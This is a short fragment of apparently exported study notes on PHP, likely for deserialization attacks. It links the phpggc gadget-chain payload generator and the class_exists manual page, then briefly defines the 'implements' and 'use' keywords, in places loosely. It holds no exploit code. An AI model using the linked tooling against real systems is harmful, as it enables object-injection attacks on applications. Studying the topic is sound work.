class=""><mark class="highlight-teal">tool: </mark><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><p id="75bf8eef-8fa9-4737-93d3-604f7276d3bf" class=""><a href="https://www.php.net/manual/en/function.class-exists.php">PHP: class_exists - Manual</a></p><p id="8529bde2-340f-4e6d-81c0-524a52c30c1a" class=""><mark class="highlight-teal">Implements:</mark></p><p id="43ce8e89-9f37-4b20-bb4d-bb90ed3a044c" class="">The implements keyword is used to declare that a class must have the methods described in the specified interface. This is called <mark class="highlight-red">polymorphism</mark>. Polymorphism makes it easy to use a variety of different objects in the same way.</p><p id="083d006e-ffa9-473b-80a1-9bf55039099c" class=""><mark class="highlight-teal">Use:</mark></p><p id="5b5dc79c-6970-4ba6-b3ae-88b2c0c9f7bd" class="">The use keyword has two purposes: it tells a class to <mark class="highlight-red">inherit</mark> a trait and it gives an alias to a namespace.</p><p id="60eda573-4234-4eed-bb5c-cf6cc6a98705" class="">
+</p><p id="1771471b-93b3-47f8-80bc-e0a6317204fb" class="">
+</p><p id="768fdb12-715c-46b5-b5d9-eefcdd849a95" class="">
+</p><p id="3ff9c993-0aea-4c92-9d85-8b65a5d54cc3" class="">
+</p></div></article></body></html>
